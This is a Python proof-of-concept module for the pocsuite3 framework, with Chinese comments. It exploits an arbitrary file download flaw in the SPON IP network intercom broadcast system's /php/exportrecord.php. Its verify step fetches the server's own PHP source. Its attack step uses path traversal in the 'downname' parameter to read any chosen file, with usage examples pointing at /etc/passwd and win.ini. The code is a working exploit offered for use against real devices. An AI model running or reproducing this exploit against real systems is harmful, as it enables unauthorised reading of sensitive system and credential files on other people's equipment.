from collections import OrderedDict
from urllib.parse import urljoin
import re
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['luckying']  #  PoC作者的大名
    vulDate = '2021-08-24'  #漏洞公开的时间,不知道就写今天
    createDate = '2021-08-24'  # 编写 PoC 的日期
    updateDate = '2021-08-24'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = 'SPON IP网络对讲广播系统exportrecord.php任意文件下载'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = 'IP网络对讲广播系统'  # 漏洞应用名称
    appVersion = '''ALL'''  # 漏洞影响版本
    vulType = VUL_TYPE.ARBITRARY_FILE_DOWNLOAD  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        世邦通信股份有限公司SPON IP网络对讲广播系统 /php/exportrecord.php页面存在任意文件下载  
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    利用:pocsuite -r .\poc++.py -u url(-f url.txt) --attack --path ../../../etc/passwd
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        o["path"] = OptString(default='c:/windows/win.ini',description='输入文件路径',require=False)
        return o

    def _verify(self):
        result = {}
        path = "/php/exportrecord.php?downname=../php/exportrecord.php"
        url = self.url + path
        try:
            resq = requests.get(url=url,timeout=5)
            if resq and resq.status_code == 200 and "$_GET" in resq.text:
                #print(resq_windows.text)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['POC'] = path
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        result = {}
        path = self.get_option("path")
        path = f"/php/exportrecord.php?downname={path}"
        url = self.url + path
        try:
            resq = requests.post(url=url,timeout=5)
            t = resq.text
            t = t.replace('\n', '').replace('\r', '')
            print('output >>> ' + t)
            t = t.replace(" ", "")
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Name'] = t
        except Exception as e:
            return

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)